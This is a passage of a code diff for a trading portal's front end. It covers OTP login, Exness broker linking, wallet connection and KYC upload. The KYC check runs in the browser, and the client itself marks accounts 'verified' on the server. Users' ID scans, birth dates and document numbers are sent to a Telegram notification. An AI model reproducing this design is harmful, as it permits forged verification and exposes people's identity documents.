+      const verifyOtpBtn = document.getElementById('verifyOtpBtn');
+      const resendOtpBtn = document.getElementById('resendOtpBtn');
+      const backToAuthBtn = document.getElementById('backToAuthBtn');
+      const otpStatus = document.getElementById('otpStatus');
     const loginForm = document.getElementById('loginForm');
     const dashboard = document.getElementById('dashboard');
     const authArea = document.getElementById('authArea');
@@ -280,17 +607,67 @@
 
     const dashName = document.getElementById('dashName');
     const dashEmail = document.getElementById('dashEmail');
+    const dashUserId = document.getElementById('dashUserId');
 
     const freeAccessBtn = document.getElementById('freeAccessBtn');
+    const freeUserId = document.getElementById('freeUserId');
     const convertBtn = document.getElementById('convertBtn');
     const connectWalletBtn = document.getElementById('connectWalletBtn');
     const payNowBtn = document.getElementById('payNowBtn');
     const convertStatus = document.getElementById('convertStatus');
     const logoutBtn = document.getElementById('logoutBtn');
+    const walletStatus = document.getElementById('walletStatus');
+    const walletType = document.getElementById('walletType');
+    const dashWallet = document.getElementById('dashWallet');
+    const walletFallbackCard = document.getElementById('walletFallbackCard');
+    const walletFallbackTitle = document.getElementById('walletFallbackTitle');
+    const walletFallbackMessage = document.getElementById('walletFallbackMessage');
+    const walletOpenSelectedBtn = document.getElementById('walletOpenSelectedBtn');
+    const walletCopyLinkBtn = document.getElementById('walletCopyLinkBtn');
+    const walletQrCode = document.getElementById('walletQrCode');
+    const walletAppBtns = document.querySelectorAll('.wallet-app-btn');
+    const profileName = document.getElementById('profileName');
+    const profileEmail = document.getElementById('profileEmail');
+    const profileUserId = document.getElementById('profileUserId');
+    const brokerName = document.getElementById('brokerName');
+    const brokerAccountId = document.getElementById('brokerAccountId');
+    const completeBrokerSignupBtn = document.getElementById('completeBrokerSignupBtn');
+    const brokerSignupStatus = document.getElementById('brokerSignupStatus');
+    const saveProfileBtn = document.getElementById('saveProfileBtn');
+    const profileStatus = document.getElementById('profileStatus');
+    const kycBadge = document.getElementById('kycBadge');
+    const kycSidebarBadge = document.getElementById('kycSidebarBadge');
+    const submitKycBtn = document.getElementById('submitKycBtn');
+    const kycStatus = document.getElementById('kycStatus');
+    const kycDocument = document.getElementById('kycDocument');
+    const kycDocumentMeta = document.getElementById('kycDocumentMeta');
+    const dashboardNavBtns = document.querySelectorAll('.dashboard-nav-btn');
+    const dashboardPanels = {
+      home: document.getElementById('panelHome'),
+      trade: document.getElementById('panelTrade'),
+      deposit: document.getElementById('panelDeposit'),
+      profile: document.getElementById('panelProfile')
+    };
 
     let currentUser = null;
+      let pendingVerificationEmail = null;
     let paymentManager = null;
     let lastQuote = null;
+    let walletFallbackLink = '';
+    let publicChartInitialized = false;
+    const INACTIVITY_MS = 10 * 60 * 1000;
+    let inactivityTimer = null;
+    let lastSessionWriteAt = 0;
+
+    function trackAnalyticsEvent(name, properties) {
+      try {
+        if (typeof window.va === 'function') {
+          window.va('event', { name: name, data: properties });
+        }
+      } catch (_) {
+        // Analytics should never block product flows.
+      }
+    }
 
     function showStatus(el, message, tone) {
       el.className = 'mt-3 text-center text-xs';
@@ -305,31 +682,127 @@
       return String(value || '').replace(/[\x00-\x1F\x7F]/g, ' ').trim().slice(0, max);
     }
 
-    function loadUsers() {
+    function getSession() {
+      // Session format: { token: '64hexchars', lastActiveAt: 'ISO' }
+      const raw = localStorage.getItem(SESSION_KEY);
+      if (!raw) return null;
       try {
-        return JSON.parse(localStorage.getItem(USERS_KEY) || '{}');
-      } catch (_) {
-        return {};
-      }
+        const parsed = JSON.parse(raw);
+        if (parsed && parsed.token) return parsed;
+      } catch (_) {}
+      return null;
     }
 
-    function saveUsers(users) {
-      localStorage.setItem(USERS_KEY, JSON.stringify(users));
-    }
-
-    function setSession(email) {
-      localStorage.setItem(SESSION_KEY, email);
+    function setSession(token, lastActiveAt) {
+      localStorage.setItem(SESSION_KEY, JSON.stringify({
+        token: String(token || ''),
+        lastActiveAt: lastActiveAt || new Date().toISOString()
+      }));
     }
 
     function clearSession() {
       localStorage.removeItem(SESSION_KEY);
     }
 
-    async function hashPassword(password) {
-      const data = new TextEncoder().encode(password);
-      const digest = await crypto.subtle.digest('SHA-256', data);
-      const bytes = Array.from(new Uint8Array(digest));
-      return bytes.map((b) => b.toString(16).padStart(2, '0')).join('');
+    function stopInactivityTimer() {
+      if (inactivityTimer) {
+        clearTimeout(inactivityTimer);
+        inactivityTimer = null;
+      }
+    }
+
+    function performLogout(reason) {
+      stopInactivityTimer();
+      clearSession();
+      currentUser = null;
+      dashboard.classList.add('hidden');
+      authArea.classList.remove('hidden');
+      if (reason === 'inactive') {
+        showStatus(loginStatus, 'Session timed out after 10 minutes of inactivity. Please log in again.', 'neutral');
+      }
+    }
+
+    function markSessionActive() {
+      if (!currentUser) return;
+      const now = Date.now();
+      if (now - lastSessionWriteAt > 15000) {
+        const session = getSession();
+        if (session && session.token) setSession(session.token, new Date(now).toISOString());
+        lastSessionWriteAt = now;
+      }
+      stopInactivityTimer();
+      inactivityTimer = setTimeout(() => {
+        performLogout('inactive');
+      }, INACTIVITY_MS);
+    }
+
+    function bindInactivityTracking() {
+      ['click', 'keydown', 'mousemove', 'scroll', 'touchstart'].forEach((eventName) => {
+        window.addEventListener(eventName, markSessionActive, { passive: true });
+      });
+      document.addEventListener('visibilitychange', () => {
+        if (!document.hidden) markSessionActive();
+      });
+    }
+
+    function renderBrokerSignupState(user) {
+      if (!user) return;
+      const profile = user.brokerProfile || {};
+      brokerName.value = profile.name || '';
+      brokerAccountId.value = profile.accountId || '';
+      if (user.brokerSignup) {
+        showStatus(brokerSignupStatus, 'Broker signup verified.', 'success');
+      } else {
+        brokerSignupStatus.classList.add('hidden');
+      }
+    }
+
+    function populateConverterCurrencies() {
+      const manager = initializePaymentManager();
+      if (!manager) return;
+
+      const fromSelect = document.getElementById('payFrom');
+      const toSelect = document.getElementById('payTo');
+      const symbols = manager.getSupportedCurrencySymbols();
+      const payoutSymbols = manager.getPayoutCurrencySymbols();
+
+      const fill = (selectEl, list) => {
+        const current = selectEl.value;
+        selectEl.innerHTML = '';
+        list.forEach((code) => {
+          const option = document.createElement('option');
+          option.value = code;
+          option.textContent = code;
+          option.className = 'text-black';
+          selectEl.appendChild(option);
+        });
+        if (list.includes(current)) {
+          selectEl.value = current;
+        }
+      };
+
+      fill(fromSelect, symbols);
+      fill(toSelect, payoutSymbols);
+    }
+
+    async function fetchAccessVerificationToken(account) {
+      const response = await fetch('/api/access-verify-token', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          email: account.email,
+          userId: (account.brokerProfile && account.brokerProfile.accountId) || '',
+          brokerName: (account.brokerProfile && account.brokerProfile.name) || '',
+          brokerAccountId: (account.brokerProfile && account.brokerProfile.accountId) || ''
+        })
+      });
+
+      const result = await response.json();
+      if (!response.ok || !result?.ok || !result?.token) {
+        throw new Error(result?.error || 'token_fetch_failed');
+      }
+
+      return result.token;
     }
 
     async function notifyEvent(type, payload) {
@@ -346,11 +819,62 @@
 
     function showDashboard(user) {
       currentUser = user;
+      const clientId = (user.brokerProfile && user.brokerProfile.accountId) || null;
       dashName.textContent = user.name;
       dashEmail.textContent = user.email;
+      dashUserId.textContent = clientId ? 'Client ID: ' + clientId : 'Client ID: Link broker in Profile';
+      profileName.value = user.name;
+      profileEmail.value = user.email;
+      profileUserId.value = clientId || '';
       authArea.classList.add('hidden');
+      otpArea.classList.add('hidden');
       dashboard.classList.remove('hidden');
       dashboard.scrollIntoView({ behavior: 'smooth', block: 'start' });
+      renderKycState(user);
+      renderBrokerSignupState(user);
+      markSessionActive();
+      switchDashboardPanel('home');
+    }
+
+    function switchDashboardPanel(panel) {
+      Object.entries(dashboardPanels).forEach(([name, node]) => {
+        if (!node) return;
+        node.classList.toggle('hidden', name !== panel);
+      });
+      dashboardNavBtns.forEach((btn) => {
+        btn.classList.toggle('active', btn.dataset.panel === panel);
+      });
+      if (panel === 'home') requestAnimationFrame(initDashboardChart);
+    }
+
+    function renderKycState(user) {
+      const state = (user && user.kycState) || 'unverified';
+      const kycForm = document.getElementById('kycForm');
+      const kycPending = document.getElementById('kycPending');
+      const kycVerified = document.getElementById('kycVerified');
+      if (!kycForm) return;
+      kycForm.classList.add('hidden');
+      kycPending.classList.add('hidden');
+      kycVerified.classList.add('hidden');
+      if (state === 'unverified') {
+        kycForm.classList.remove('hidden');
+        kycBadge.textContent = 'Unverified';
+        kycBadge.className = 'rounded-full border border-red-500/30 bg-red-500/10 px-3 py-1 text-[10px] uppercase tracking-[0.12em] font-semibold text-red-400';
+        kycSidebarBadge.textContent = 'Unverified';
+        kycSidebarBadge.className = 'mt-1 text-[10px] text-red-400';
+      } else if (state === 'pending') {
+        kycPending.classList.remove('hidden');
+        kycBadge.textContent = 'Pending Review';
+        kycBadge.className = 'rounded-full border border-yellow-500/30 bg-yellow-500/10 px-3 py-1 text-[10px] uppercase tracking-[0.12em] font-semibold text-yellow-400';
+        kycSidebarBadge.textContent = 'KYC Pending';
+        kycSidebarBadge.className = 'mt-1 text-[10px] text-yellow-400';
+      } else if (state === 'verified') {
+        kycVerified.classList.remove('hidden');
+        kycBadge.textContent = '\u2713 Verified';
+        kycBadge.className = 'rounded-full border border-[var(--dash-accent)]/30 bg-[var(--dash-accent)]/10 px-3 py-1 text-[10px] uppercase tracking-[0.12em] font-semibold text-[var(--dash-accent)]';
+        kycSidebarBadge.textContent = '\u2713 Verified';
+        kycSidebarBadge.className = 'mt-1 text-[10px] text-[var(--dash-accent)]';
+      }
     }
 
     function initializePaymentManager() {
@@ -360,6 +884,101 @@
       return paymentManager;
     }
 
+    function getFileSizeLabel(bytes) {
+      const value = Number(bytes || 0);
+      if (!value || value < 0) return 'N/A';
+      if (value < 1024) return value + ' B';
+      if (value < 1024 * 1024) return (value / 1024).toFixed(1) + ' KB';
+      return (value / (1024 * 1024)).toFixed(2) + ' MB';
+    }
+
+    async function fileToDataUrl(file) {
+      return await new Promise((resolve, reject) => {
+        const reader = new FileReader();
+        reader.onload = () => resolve(String(reader.result || ''));
+        reader.onerror = () => reject(new Error('file_read_failed'));
+        reader.readAsDataURL(file);
+      });
+    }
+
+    function runAutoKycVerification(input) {
+      const reasons = [];
+      const acceptedTypes = ['image/png', 'image/jpeg', 'image/webp', 'application/pdf'];
+      const acceptedExtensions = ['.png', '.jpg', '.jpeg', '.webp', '.pdf'];
+      const ageMs = Date.now() - new Date(input.dob).getTime();
+      const ageYears = ageMs / (365.25 * 24 * 60 * 60 * 1000);
+      const fileName = String(input.documentFile?.name || '').toLowerCase();
+      const hasAcceptedExtension = acceptedExtensions.some((ext) => fileName.endsWith(ext));
+      const hasAcceptedType = acceptedTypes.includes(input.documentFile?.type || '');
+
+      if (!input.documentFile) reasons.push('No document selected');
+      if (input.documentFile && !hasAcceptedType && !hasAcceptedExtension) reasons.push('Unsupported document type');
+      if (input.documentFile && input.documentFile.size > 2 * 1024 * 1024) reasons.push('Document exceeds 2 MB limit');
+      if (!/^[A-Za-z0-9-]{6,40}$/.test(input.docNumber)) reasons.push('Document number format is invalid');
+      if (!(ageYears >= 18)) reasons.push('Account holder must be at least 18');
+      if (!input.country || input.country.length < 2) reasons.push('Country is invalid');
+      if (!input.idType) reasons.push('ID type is missing');
+
+      return {
+        passed: reasons.length === 0,
+        decision: reasons.length === 0 ? 'verified' : 'pending_review',
+        reason: reasons.length === 0
+          ? 'Automated checks passed'
+          : reasons.join('; ')
+      };
+    }
+
+    function getWalletDappUrl() {
+      return window.location.origin + window.location.pathname + '#portalAuth';
+    }
+
+    function openWalletAppLink(walletName) {
+      const manager = initializePaymentManager();
+      if (!manager) return;
+      const nextLink = manager.getWalletAppLink(walletName, getWalletDappUrl());
+      if (!nextLink) return;
+      walletFallbackLink = nextLink;
+      window.location.href = nextLink;
+    }
+
+    function renderWalletFallback(selectedWallet) {
+      const manager = initializePaymentManager();
+      if (!manager || !walletFallbackCard) return null;
+
+      const type = String(selectedWallet || 'auto').toLowerCase();
+      const chosenType = type === 'walletconnect' ? 'auto' : type;
+      const dappUrl = getWalletDappUrl();
+      const appLink = manager.getWalletAppLink(chosenType, dappUrl);
+
+      walletFallbackLink = appLink;
+      walletFallbackCard.classList.remove('hidden');
+      walletFallbackTitle.textContent = type === 'walletconnect'
+        ? 'Continue in any mobile wallet app'
+        : 'Continue in your wallet app';
+      walletFallbackMessage.textContent = type === 'walletconnect'
+        ? 'No browser extension is required. Open this site inside a wallet app browser, or scan the QR code with your phone.'
+        : 'This wallet is not installed in the browser. Open the site in the wallet app, or scan the QR code on your phone.';
+      walletOpenSelectedBtn.textContent = type === 'walletconnect'
+        ? 'Open Site On Mobile Wallet'
+        : 'Open Selected Wallet App';
+
+      walletQrCode.innerHTML = '';
+      if (typeof QRCode !== 'undefined') {
+        new QRCode(walletQrCode, {
+          text: dappUrl,
+          width: 168,
+          height: 168,
+          colorDark: '#e8e0d0',
+          colorLight: '#0e1114'
+        });
+      }
+
+      return {
+        appLink: appLink,
+        isMobile: manager.isMobileBrowser()
+      };
+    }
+
     signupForm.addEventListener('submit', async (event) => {
       event.preventDefault();
 
@@ -367,43 +986,51 @@
       const email = normalize(document.getElementById('signupEmail').value, 120).toLowerCase();
       const password = document.getElementById('signupPassword').value;
       const confirm = document.getElementById('signupConfirm').value;
+      const phone = normalize(document.getElementById('signupPhone').value, 20);
 
       if (!name || !email || !password) {
-        showStatus(signupStatus, 'All fields are required.', 'error');
+        showStatus(signupStatus, 'Name, email and password are required.', 'error');
         return;
       }
-
       if (password.length < 8) {
         showStatus(signupStatus, 'Password must be at least 8 characters.', 'error');
         return;
       }
-
       if (password !== confirm) {
         showStatus(signupStatus, 'Password confirmation does not match.', 'error');
         return;
       }
 
-      const users = loadUsers();
-      if (users[email]) {
-        showStatus(signupStatus, 'Account already exists. Please log in.', 'error');
-        return;
+      showStatus(signupStatus, 'Creating account...', 'neutral');
+      try {
+        const res = await fetch('/api/auth-register', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ name, email, password, phone: phone || undefined })
+        });
+        const result = await res.json();
+        if (result.error === 'email_already_registered') {
+          showStatus(signupStatus, 'Account already exists. Please log in.', 'error');
+          return;
+        }
+        if (!res.ok || !result.ok) {
+          showStatus(signupStatus, result.error === 'password_too_short' ? 'Password must be at least 8 characters.' : (result.detail || result.error || 'Registration failed.'), 'error');
+          return;
+        }
+        // Show OTP panel
+        pendingVerificationEmail = email;
+        otpEmailDisplay.textContent = email;
+        otpCode.value = '';
+        showStatus(otpStatus, '', 'neutral');
+        otpStatus.classList.add('hidden');
+        authArea.classList.add('hidden');
+        otpArea.classList.remove('hidden');
+        otpArea.scrollIntoView({ behavior: 'smooth', block: 'center' });
+        await notifyEvent('user.created', { name, email, message: 'Client account created — pending verification' });
+        trackAnalyticsEvent('account_created', { source: 'portal' });
+      } catch (_) {
+        showStatus(signupStatus, 'Network error. Please try again.', 'error');
       }
-
-      const passwordHash = await hashPassword(password);
-      users[email] = {
-        name: name,
-        email: email,
-        passwordHash: passwordHash,
-        freeAccess: false,
-        createdAt: new Date().toISOString()
-      };
-
-      saveUsers(users);
-      setSession(email);
-      await notifyEvent('user.created', { name: name, email: email, message: 'Client account created' });
-
-      showStatus(signupStatus, 'Account created. Redirecting to dashboard...', 'success');
-      showDashboard(users[email]);
     });
 
     loginForm.addEventListener('submit', async (event) => {
@@ -412,24 +1039,43 @@
       const email = normalize(document.getElementById('loginEmail').value, 120).toLowerCase();
       const password = document.getElementById('loginPassword').value;
 
-      const users = loadUsers();
-      const account = users[email];
-
-      if (!account) {
-        showStatus(loginStatus, 'No account found for that email.', 'error');
+      if (!email || !password) {
+        showStatus(loginStatus, 'Email and password are required.', 'error');
         return;
       }
 
-      const passwordHash = await hashPassword(password);
-      if (passwordHash !== account.passwordHash) {
-        showStatus(loginStatus, 'Invalid credentials.', 'error');
-        return;
+      showStatus(loginStatus, 'Authenticating...', 'neutral');
+      try {
+        const res = await fetch('/api/auth-login', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ email, password })
+        });
+        const result = await res.json();
+        if (result.error === 'account_not_verified') {
+          // Account exists but email not verified — show OTP panel
+          pendingVerificationEmail = email;
+          otpEmailDisplay.textContent = email;
+          otpCode.value = '';
+          showStatus(otpStatus, 'Your account is not verified yet. Enter the code sent to your email.', 'neutral');
+          authArea.classList.add('hidden');
+          otpArea.classList.remove('hidden');
+          otpArea.scrollIntoView({ behavior: 'smooth', block: 'center' });
+          return;
+        }
+        if (!res.ok || !result.ok) {
+          showStatus(loginStatus, result.error === 'invalid_credentials' ? 'Invalid email or password.' : (result.error || 'Login failed.'), 'error');
+          return;
+        }
+        setSession(result.token);
+        await notifyEvent('user.login', { name: result.profile.name, email: result.profile.email });
+        trackAnalyticsEvent('user_logged_in', { source: 'portal' });
+        trackAnalyticsEvent('dashboard_opened', { entry: 'login' });
+        showStatus(loginStatus, 'Access granted.', 'success');
+        showDashboard(result.profile);
+      } catch (_) {
+        showStatus(loginStatus, 'Network error. Please try again.', 'error');
       }
-
-      setSession(email);
-      await notifyEvent('user.login', { name: account.name, email: account.email });
-      showStatus(loginStatus, 'Access granted.', 'success');
-      showDashboard(account);
     });
 
     freeAccessBtn.addEventListener('click', async () => {
@@ -438,10 +1084,16 @@
         return;
       }
 
-      const users = loadUsers();
-      const account = users[currentUser.email];
-      if (!account) {
-        showStatus(freeStatus, 'Account not found.', 'error');
+      const account = currentUser;
+      if (!account.brokerSignup) {
+        showStatus(freeStatus, 'Complete broker signup first in Profile.', 'error');
+        return;
+      }
+
+      const enteredClientId = normalize(freeUserId.value, 60);
+      const storedClientId = (account.brokerProfile && account.brokerProfile.accountId) || '';
+      if (!enteredClientId || enteredClientId.toLowerCase() !== storedClientId.toLowerCase()) {
+        showStatus(freeStatus, 'Client ID mismatch. Enter your exact Exness Client ID.', 'error');
         return;
       }
 
@@ -450,17 +1102,169 @@
         return;
       }
 
-      account.freeAccess = true;
-      saveUsers(users);
-      currentUser = account;
+      showStatus(freeStatus, 'Verifying broker details securely...', 'neutral');
 
-      await notifyEvent('free.access.requested', {
-        name: account.name,
-        email: account.email,
-        plan: 'starter'
+      try {
+        const verificationToken = await fetchAccessVerificationToken(account);
+        const response = await fetch('/api/telegram-alert', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            type: 'free.access.requested',
+            payload: {
+              name: account.name,
+              email: account.email,
+              plan: 'starter',
+              userId: (account.brokerProfile && account.brokerProfile.accountId) || '',
+              brokerName: (account.brokerProfile && account.brokerProfile.name) || 'N/A',
+              brokerAccountId: (account.brokerProfile && account.brokerProfile.accountId) || 'N/A',
+              brokerPartnershipLink: BROKER_PARTNERSHIP_LINK,
+              verificationToken: verificationToken
+            }
+          })
+        });
+
+        const result = await response.json();
+        if (!response.ok || !result?.ok) {
+          throw new Error(result?.error || 'free_access_request_failed');
+        }
+
+        account.freeAccess = true;
+        // Persist free access flag to server
+        const session = getSession();
+        if (session && session.token) {
+          try {
+            const profileRes = await fetch('/api/auth-profile', {
+              method: 'PUT',
+              headers: { 'Authorization': 'Bearer ' + session.token, 'Content-Type': 'application/json' },
+              body: JSON.stringify({ freeAccess: true })
+            });
+            if (profileRes.ok) {
+              const profileResult = await profileRes.json();
+              if (profileResult.ok) currentUser = profileResult.profile;
+            }
+          } catch (_) {}
+        }
+
+        trackAnalyticsEvent('free_access_requested', { plan: 'starter' });
+        showStatus(freeStatus, 'Verification successful. Free access request accepted. Access link will be shared after final review.', 'success');
+      } catch (error) {
+        showStatus(freeStatus, 'Verification failed. Please complete broker signup correctly and retry.', 'error');
+      }
+    });
+
+    completeBrokerSignupBtn.addEventListener('click', async () => {
+      if (!currentUser) {
+        showStatus(brokerSignupStatus, 'Please sign in first.', 'error');
+        return;
+      }
+
+      const nextBrokerName = normalize(brokerName.value, 80);
+      const nextBrokerAccountId = normalize(brokerAccountId.value, 60);
+      if (!nextBrokerName || !nextBrokerAccountId) {
+        showStatus(brokerSignupStatus, 'Broker name and broker account ID are required.', 'error');
+        return;
+      }
+
+      const session = getSession();
+      if (!session || !session.token) {
+        showStatus(brokerSignupStatus, 'Session expired. Please log in again.', 'error');
+        return;
+      }
+
+      showStatus(brokerSignupStatus, 'Saving...', 'neutral');
+      try {
+        const res = await fetch('/api/auth-profile', {
+          method: 'PUT',
+          headers: { 'Authorization': 'Bearer ' + session.token, 'Content-Type': 'application/json' },
+          body: JSON.stringify({ brokerName: nextBrokerName, brokerAccountId: nextBrokerAccountId })
+        });
+        const result = await res.json();
+        if (!res.ok || !result.ok) {
+          showStatus(brokerSignupStatus, result.error || 'Save failed.', 'error');
+          return;
+        }
+        currentUser = result.profile;
+        const clientId = (currentUser.brokerProfile && currentUser.brokerProfile.accountId) || '';
+        dashUserId.textContent = 'Client ID: ' + clientId;
+        profileUserId.value = clientId;
+        await notifyEvent('user.profile.updated', {
+          name: currentUser.name,
+          email: currentUser.email,
+          userId: clientId,
+          brokerSignup: 'completed',
+          brokerName: nextBrokerName,
+          brokerAccountId: nextBrokerAccountId
+        });
+        trackAnalyticsEvent('broker_signup_completed', { brokerId: nextBrokerAccountId });
+        showStatus(brokerSignupStatus, 'Broker account linked. Your Client ID is now ' + clientId + '.', 'success');
+      } catch (_) {
+        showStatus(brokerSignupStatus, 'Network error. Please retry.', 'error');
+      }
+    });
+
+    dashboardNavBtns.forEach((btn) => {
+      btn.addEventListener('click', () => {
+        switchDashboardPanel(btn.dataset.panel);
       });
+    });
 
-      showStatus(freeStatus, 'Free access activated on your dashboard.', 'success');
+    verifyOtpBtn.addEventListener('click', async () => {
+      const code = normalize(otpCode.value, 10).replace(/\s/g, '');
+      if (!pendingVerificationEmail || !code) {
+        showStatus(otpStatus, 'Enter the 6-digit code from your email.', 'error');
+        return;
+      }
+      showStatus(otpStatus, 'Verifying...', 'neutral');
+      try {
+        const res = await fetch('/api/auth-verify-otp', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ email: pendingVerificationEmail, otp: code })
+        });
+        const result = await res.json();
+        if (!res.ok || !result.ok) {
+          const msg = result.error === 'otp_invalid' ? 'Incorrect code. Try again.' : result.error === 'otp_expired' ? 'Code expired. Request a new one.' : (result.error || 'Verification failed.');
+          showStatus(otpStatus, msg, 'error');
+          return;
+        }
+        setSession(result.token);
+        await notifyEvent('user.created', { name: result.profile.name, email: result.profile.email, message: 'Email verified — account active' });
+        trackAnalyticsEvent('email_verified', { source: 'portal' });
+        trackAnalyticsEvent('dashboard_opened', { entry: 'otp_verify' });
+        showDashboard(result.profile);
+        pendingVerificationEmail = null;
+      } catch (_) {
+        showStatus(otpStatus, 'Network error. Please retry.', 'error');
+      }
+    });
+
+    resendOtpBtn.addEventListener('click', async () => {
+      if (!pendingVerificationEmail) return;
+      showStatus(otpStatus, 'Sending new code...', 'neutral');
+      try {
+        const res = await fetch('/api/auth-resend-otp', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ email: pendingVerificationEmail })
+        });
+        const result = await res.json();
+        if (!res.ok || !result.ok) {
+          showStatus(otpStatus, result.error === 'rate_limited' ? 'Too many requests. Wait a few minutes.' : (result.error || 'Resend failed.'), 'error');
+          return;
+        }
+        showStatus(otpStatus, 'New code sent. Check your inbox.', 'success');
+      } catch (_) {
+        showStatus(otpStatus, 'Network error. Please retry.', 'error');
+      }
+    });
+
+    backToAuthBtn.addEventListener('click', () => {
+      pendingVerificationEmail = null;
+      otpArea.classList.add('hidden');
+      authArea.classList.remove('hidden');
+      otpStatus.classList.add('hidden');
+      otpCode.value = '';
     });
 
     convertBtn.addEventListener('click', async () => {
@@ -487,6 +1291,12 @@
       try {
         const converted = await manager.convertCurrency(amount, from, to);
         lastQuote = { amount: amount, from: from, to: to, converted: converted };
+        trackAnalyticsEvent('quote_generated', {
+          from: from,
+          to: to,
+          amount: amount,
+          converted: Number(converted.toFixed(6))
+        });
         convertStatus.textContent = amount.toFixed(2) + ' ' + from + ' = ' + converted.toFixed(6) + ' ' + to;
         convertStatus.className = 'mt-3 text-center text-xs text-green-400';
       } catch (_) {
@@ -502,12 +1312,208 @@
         return;
       }
 
+      const selectedWallet = walletType.value || 'auto';
+
+      if (selectedWallet === 'walletconnect' || !manager.hasInjectedWallets()) {
+        const fallback = renderWalletFallback(selectedWallet);
+        const helperMessage = fallback && fallback.isMobile
+          ? 'Opening the wallet app path for connection...'
+          : 'No extension detected. Use the wallet app buttons or scan the QR helper below.';
+        walletStatus.textContent = helperMessage;
+        walletStatus.className = 'text-center text-xs text-gray-300';
+        showStatus(paymentStatus, helperMessage, 'neutral');
+
+        if (fallback && fallback.isMobile && selectedWallet !== 'walletconnect') {
+          window.setTimeout(() => {
+            if (fallback.appLink) {
+              window.location.href = fallback.appLink;
+            }
+          }, 120);
+        }
+        return;
+      }
+
       showStatus(paymentStatus, 'Connecting wallet...', 'neutral');
       try {
-        const wallet = await manager.connectWallet('trustwallet');
-        showStatus(paymentStatus, 'Wallet connected: ' + wallet.account, 'success');
+        const wallet = await manager.connectWallet(selectedWallet);
+        trackAnalyticsEvent('wallet_connected', { provider: wallet.provider || selectedWallet });
+        const msg = 'Wallet connected (' + wallet.provider + '): ' + wallet.account;
+        dashWallet.textContent = 'Wallet: ' + wallet.account;
+        walletStatus.textContent = msg;
+        walletStatus.className = 'text-center text-xs text-green-400';
+        walletFallbackCard.classList.add('hidden');
+        showStatus(paymentStatus, msg, 'success');
+      } catch (error) {
+        const message = error && error.message ? error.message : 'Wallet connection failed.';
+        if (message.includes('No compatible wallet provider') || message.includes('Open this page in a wallet app')) {
+          renderWalletFallback(selectedWallet);
+          walletStatus.textContent = 'No extension detected. Use the wallet app buttons or scan the QR helper below.';
+          walletStatus.className = 'text-center text-xs text-gray-300';
+          showStatus(paymentStatus, 'No extension detected. Use the wallet app helper below.', 'neutral');
+          return;
+        }
+
+        walletStatus.textContent = 'Wallet connection failed. Confirm extension is installed and unlocked.';
+        walletStatus.className = 'text-center text-xs text-red-400';
+        showStatus(paymentStatus, message, 'error');
+      }
+    });
+
+    walletOpenSelectedBtn.addEventListener('click', () => {
+      const selectedWallet = walletType.value || 'auto';
+      const walletName = selectedWallet === 'walletconnect' ? 'auto' : selectedWallet;
+      openWalletAppLink(walletName);
+    });
+
+    walletCopyLinkBtn.addEventListener('click', async () => {
+      const dappUrl = getWalletDappUrl();
+      try {
+        await navigator.clipboard.writeText(dappUrl);
+        walletStatus.textContent = 'Site link copied. Open it inside your wallet app browser.';
+        walletStatus.className = 'text-center text-xs text-green-400';
       } catch (_) {
-        showStatus(paymentStatus, 'Wallet connection failed.', 'error');
+        walletStatus.textContent = 'Copy failed. Manually open: ' + dappUrl;
+        walletStatus.className = 'text-center text-xs text-gray-300';
+      }
+    });
+
+    walletAppBtns.forEach((btn) => {
+      btn.addEventListener('click', () => {
+        openWalletAppLink(btn.dataset.walletApp);
+      });
+    });
+
+    kycDocument.addEventListener('change', () => {
+      const file = kycDocument.files && kycDocument.files[0];
+      if (!file) {
+        kycDocumentMeta.textContent = 'Accepted: PNG, JPG, WEBP, PDF up to 2 MB.';
+        return;
+      }
+      kycDocumentMeta.textContent = 'Selected: ' + file.name + ' (' + getFileSizeLabel(file.size) + ')';
+    });
+
+    submitKycBtn.addEventListener('click', async () => {
+      if (!currentUser) { showStatus(kycStatus, 'Please sign in first.', 'error'); return; }
+
+      const dob = normalize(document.getElementById('kycDob').value, 20);
+      const country = normalize(document.getElementById('kycCountry').value, 60);
+      const idType = normalize(document.getElementById('kycIdType').value, 30);
+      const docNumber = normalize(document.getElementById('kycDocNumber').value, 40);
+      const documentFile = kycDocument.files && kycDocument.files[0];
+
+      if (!dob || !country || !idType || !docNumber || !documentFile) {
+        showStatus(kycStatus, 'All fields and a verification document are required.', 'error');
+        return;
+      }
+
+      if (documentFile.size > 2 * 1024 * 1024) {
+        showStatus(kycStatus, 'Document must be 2 MB or smaller.', 'error');
+        return;
+      }
+
+      showStatus(kycStatus, 'Running auto verification...', 'neutral');
+
+      const account = currentUser;
+      const autoVerification = runAutoKycVerification({
+        dob: dob,
+        country: country,
+        idType: idType,
+        docNumber: docNumber,
+        documentFile: documentFile
+      });
+
+      const documentBase64 = await fileToDataUrl(documentFile);
+      const newKycState = autoVerification.passed ? 'verified' : 'pending';
+      const newKycData = {
+        dob: dob,
+        country: country,
+        idType: idType,
+        docNumber: docNumber,
+        submittedAt: new Date().toISOString(),
+        documentName: documentFile.name,
+        documentType: documentFile.type,
+        documentSize: documentFile.size,
+        autoDecision: autoVerification.decision,
+        autoReason: autoVerification.reason
+      };
+      // Persist KYC state to server
+      const kycSession = getSession();
+      if (kycSession && kycSession.token) {
+        try {
+          const kycRes = await fetch('/api/auth-profile', {
+            method: 'PUT',
+            headers: { 'Authorization': 'Bearer ' + kycSession.token, 'Content-Type': 'application/json' },
+            body: JSON.stringify({ kycState: newKycState, kycData: newKycData })
+          });
+          if (kycRes.ok) {
+            const kycResult = await kycRes.json();
+            if (kycResult.ok) currentUser = kycResult.profile;
+          }
+        } catch (_) {}
+      }
+
+      await notifyEvent('kyc.submitted', {
+        name: account.name,
+        email: account.email,
+        country: country,
+        idType: idType,
+        docNumber: docNumber,
+        dob: dob,
+        documentName: documentFile.name,
+        documentType: documentFile.type,
+        documentSize: String(documentFile.size),
+        documentBase64: documentBase64,
+        autoDecision: autoVerification.decision,
+        autoReason: autoVerification.reason
+      });
+      trackAnalyticsEvent('kyc_submitted', { idType: idType, decision: autoVerification.decision });
+      renderKycState(account);
+      showStatus(
+        kycStatus,
+        autoVerification.passed
+          ? 'Auto verification passed. Account verified and details shared to Telegram.'
